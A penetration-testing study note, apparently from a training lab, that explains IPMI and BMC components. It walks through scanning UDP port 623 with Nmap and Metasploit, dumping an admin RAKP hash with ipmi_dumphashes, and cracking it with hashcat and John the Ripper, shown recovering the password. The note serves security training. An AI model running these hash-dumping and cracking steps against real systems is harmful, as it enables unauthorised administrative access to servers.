# 🟢 IPMI

### &#x20;IPMI is typically used in three ways:

* Before the OS has booted to modify BIOS settings
* When the host is fully powered down
* Access to a host after a system failure

The IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band.

### To function, IPMI requires the following components:

* Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
* Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
* Intelligent Platform Management Bus (IPMB) - extends the BMC
* IPMI Memory - stores things such as the system event log, repository store data, and more
* Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus

&#x20;Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.&#x20;

Below is a sample Nmap scan using the Nmap [ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html) NSE script to footprint the service.

```
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

**Metasploit Version Scan**

```
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
```

```
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts 10.129.202.5
run
```

```
[+] 10.129.202.5:623 - IPMI - Hash found: admin:7695808482000000bff21a6dc73c0720231565b2d2f1f7cd44912deef8eec08457c691efcde9f73ea123456789abcdefa123456789abcdef140561646d696e:235d2268c59c623daf0482a681afc35b3e821d0e
put the hash inside a file
```

```
hashcat -m 7300 HASH_admin.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> ls
[*] exec: ls

Desktop  HASH_admin.txt  install.sh  JOHN_FILE.txt  odat  oracle-instantclient-sqlplus_19.6.0.0.0-0parrot2_amd64.deb  Templates
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> john JOHN_FILE.txt
[*] exec: john JOHN_FILE.txt

Created directory: /home/htb-ac-51753/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 32 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
trinity          (10.129.202.5 admin)
trinity          (10.129.202.5 admin)
trinity          (10.129.202.5 admin)
3g 0:00:00:10 DONE 2/3 (2024-01-12 22:05) 0.2955g/s 16331p/s 42160c/s 42160C/s 123456..9brooklyn
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
